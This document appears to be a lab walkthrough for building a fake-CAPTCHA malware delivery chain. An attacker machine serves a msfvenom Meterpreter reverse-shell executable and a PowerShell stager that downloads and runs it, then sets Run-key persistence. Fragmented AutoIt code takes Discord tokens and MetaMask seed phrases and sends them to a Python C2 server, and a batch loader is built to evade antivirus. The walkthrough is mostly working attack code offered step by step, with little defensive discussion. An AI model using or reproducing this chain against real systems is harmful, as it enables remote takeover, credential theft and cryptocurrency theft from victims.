
## Window 10 ( Victim )

## Debian 13 ( Attacker )

1. **Preparing compromised website** 
```bash
mkdir -p /var/www/html/captcha
nano /var/www/html/captcha/index.html
git clone <FAKEWEB.git>
```
 
2. **Make it be able to access the web server**
```bash
sudo chown www-data:www-data -R /var/www/html/captcha
sudo chmod 755 -R /var/www/html/captcha
```

3. Creating payload and listener
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.204.152 LPORT=4444 -f exe -o Set-up.exe
```

4. Let's create a new folder named **"payload"** and move **"Set-up.exe"** into this folder.
```bash
mkdir -p /var/www/html/payload
mv Set-up.exe /var/www/html/payload/
```

5. Allow other users to download it via HTTP
```bash
sudo chown www-data:www-data /var/www/html/payload/Set-up.exe
sudo chmod 644 /var/www/html/payload/Set-up.exe
```

6. Bundle `Set-up.exe` file into an archive named `win15.zip`
```bash
mkdir -p /tmp/win15
cp /var/www/html/payload/Set-up.exe /tmp/win15/
cd /tmp/win15
zip /var/www/html/payload/win15.zip Set-up.exe
rm -rf /tmp/win15
```

7. Ensure that Apache can serve the ZIP file.
```bash
sudo chown www-data:www-data /var/www/html/payload/win15.zip
sudo chmod 644 /var/www/html/payload/win15.zip
```

8. Creating win15.txt which will execute the following commands
```powershell
$zipUrl = "http://192.168.204.152/payload/win15.zip"
$zipDest = "$env:APPDATA\bFylC6zX.zip"
$extractPath = "$env:APPDATA\7oCDTWYu"
Invoke-WebRequest -Uri $zipUrl -OutFile $zipDest
Expand-Archive -Path $zipDest -DestinationPath $extractPath -Force
$setupPath = "$extractPath\Set-up.exe"
if (-not (Test-Path $extractPath)) { New-Item -Path $extractPath -ItemType Directory }
Start-Process -FilePath $setupPath 
Start-BitsTransfer -Source "http://192.168.204.152/payload/hose.cmd" -Destination "$extractPath\Hose.cmd"
Start-Process -FilePath "cmd.exe" -ArgumentList "/c $extractPath\Hose.cmd"
New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "5TQjtTuo" -Value $setupPath -PropertyType String -Force
```
> **Breakdown**:
- **$zipUrl:** The web address where the ZIP file is hosted on Kali.
- **$zipDest:** Saves the ZIP to a hidden folder in the user’s AppData (`%APPDATA%\bFylC6zX.zip`) to avoid easy detection.
- **$extractPath:** Sets the extraction location to `%APPDATA%\7oCDTWYu`, another hidden folder.
- **Invoke-WebRequest:** Downloads the ZIP file from Kali.
- **Expand-Archive:** Unzips `Set-up.exe` to the extraction path.
- **if (-not (Test-Path $extractPath)):** Checks if the extraction directory exists; if not, creates it.
- **Start-Process -FilePath $setupPath:** Runs `Set-up.exe` to establish the reverse shell.
- **Start-BitsTransfer:** Downloads the next script (`Hose.cmd`) to continue the attack.
- **Start-Process -FilePath "cmd.exe":** Executes `Hose.cmd` using the Command Prompt.
- **New-ItemProperty:** Adds a registry key to make `Set-up.exe` run every time the computer starts (persistence).

9. Change File Permission 
```bash
sudo chown www-data:www-data /var/www/html/payload/win15.txt
sudo chmod 644 /var/www/html/payload/win15.txt
```

10. C2 Constructing
```bash
echo "#NoTrayIcon" | sudo tee /var/www/html/payload/Italy
echo "#include <File.au3>" | sudo tee -a /var/www/html/payload/Italy
echo "#include <Inet.au3>" | sudo tee /var/www/html/payload/Holmes
echo "Local \$sData = ''" | sudo tee /var/www/html/payload/True
echo "Local \$sFile = @AppDataDir & '\Discord\localStorage\discord_token.txt'" | sudo tee /var/www/html/payload/Lying
echo "If FileExists(\$sFile) Then \$sData &= FileRead(\$sFile) & @CRLF" | sudo tee /var/www/html/payload/Responded
echo "Local \$sFile = @AppDataDir & '\MetaMask\seed_phrase.txt'" | sudo tee /var/www/html/payload/Proc
echo "If FileExists(\$sFile) Then \$sData &= FileRead(\$sFile) & @CRLF" | sudo tee /var/www/html/payload/Fa
echo -E "InetGet('http://192.168.204.152:8080/c2?data=' & \$sData, @TempDir & '\exfil_data.txt', 1)" | sudo tee /var/www/html/payload/Ink
```

11. To have it work, we need `hose.cmd` to concatenates them 
```cmd
#NoTrayIcon
#include <File.au3>
#include <Inet.au3>
Local $sData = ''
Local $sFile = @AppDataDir & '\Discord\localStorage\discord_token.txt'
If FileExists($sFile) Then $sData &= FileRead($sFile) & @CRLF
Local $sFile = @AppDataDir & '\MetaMask\seed_phrase.txt'
If FileExists($sFile) Then $sData &= FileRead($sFile) & @CRLF
InetGet('http://192.168.204.152:8080/c2?data=' & $sData, @TempDir & '\exfil_data.txt', 1)
```

12. Change Permission 
```bash
sudo chown www-data:www-data /var/www/html/payload/{Italy,Holmes,True,Lying,Responded,Proc,Fa,Ink}
sudo chmod 644 /var/www/html/payload/{Italy,Holmes,True,Lying,Responded,Proc,Fa,Ink}
```

13. Another `hose.cmd`
```cmd
@echo off
tasklist | findstr /I "wrsa opssvc" & if not errorlevel 1 ping -n 198 127.0.0.1
Set /a Realtor=195402
mkdir %TEMP%\195402
cd %TEMP%\195402

:: Check if AutoIt3_x64.exe exists, if not download it
if not exist "C:\Program Files (x86)\AutoIt3\AutoIt3_x64.exe" (
    powershell -Command "Invoke-WebRequest -Uri 'http://192.168.204.152/payload/AutoIt3_x64.exe' -OutFile 'AutoIt3_x64.exe'"
)

:: Set the AutoIt3 executable path
Set AUTOIT_PATH=%CD%\AutoIt3_x64.exe

:: Download payload fragments to evade detection
powershell -Command "Invoke-WebRequest -Uri 'http://192.168.204.152/payload/Italy' -OutFile '..\Italy'"
powershell -Command "Invoke-WebRequest -Uri 'http://192.168.204.152/payload/Holmes' -OutFile '..\Holmes'"
powershell -Command "Invoke-WebRequest -Uri 'http://192.168.204.152/payload/True' -OutFile '..\True'"
powershell -Command "Invoke-WebRequest -Uri 'http://192.168.204.152/payload/Lying' -OutFile '..\Lying'"
powershell -Command "Invoke-WebRequest -Uri 'http://192.168.204.152/payload/Responded' -OutFile '..\Responded'"
powershell -Command "Invoke-WebRequest -Uri 'http://192.168.204.152/payload/Proc' -OutFile '..\Proc'"
powershell -Command "Invoke-WebRequest -Uri 'http://192.168.204.152/payload/Fa' -OutFile '..\Fa'"
powershell -Command "Invoke-WebRequest -Uri 'http://192.168.204.152/payload/Ink' -OutFile '..\Ink'"

:: Concatenate all payload components to create the final a3x file
cmd /c copy /b ..\Italy + ..\Holmes + ..\True + ..\Lying + ..\Responded + ..\Proc + ..\Fa + ..\Ink suggests.a3x

:: Execute the final payload
if exist "%AUTOIT_PATH%" (
    "%AUTOIT_PATH%" suggests.a3x
) else (
    "C:\Program Files (x86)\AutoIt3\AutoIt3_x64.exe" suggests.a3x
)

:: Wait before exit
choice /d y /t 5
```
You can download `AutoIt3_x64.exe` from the official website using the following link: [https://www.autoitscript.com/site/autoit/downloads/](https://www.autoitscript.com/site/autoit/downloads/)

14. Change Permission 
```bash
sudo chown www-data:www-data /var/www/html/payload/hose.cmd
sudo chmod 644 /var/www/html/payload/hose.cmd
```

Next, let's update the permissions for the `hose.cmd` file.

```bash
sudo chown www-data:www-data /var/www/html/payload/hose.cmd
sudo chmod 644 /var/www/html/payload/hose.cmd
```

We now need to develop a Python-based Command and Control (C2) server to receive the exfiltrated data.

```bash
nano /var/www/html/c2.py
```

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

class C2Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        query = urllib.parse.urlparse(self.path).query
        params = urllib.parse.parse_qs(query)
        data = params.get('data', ['No data'])[0]
        with open('/var/www/html/c2_data.txt', 'a') as f:
            f.write(f"[C2 GET {self.log_date_time_string()}] {data}\n")
        self.send_response(200)
        self.end_headers()

server = HTTPServer(('', 8080), C2Handler)
print("C2 Server Started on port 8080")
server.serve_forever()
```

Let's start the C2 server and configure the appropriate permissions for the `c2_data.txt` file.

```bash
sudo python3 /var/www/html/c2.py
sudo chown www-data:www-data /var/www/html/c2_data.txt
sudo chmod 644 /var/www/html/c2_data.txt
```

Before launching the attack, let's first start a listener to capture the reverse shell from **Set-up.exe**.

```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.204.152
set LPORT 4444
exploit
```

The attack appears to have been successful; let's now verify whether the registry key was also added.

```powershell
Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "5TQjtTuo"
```

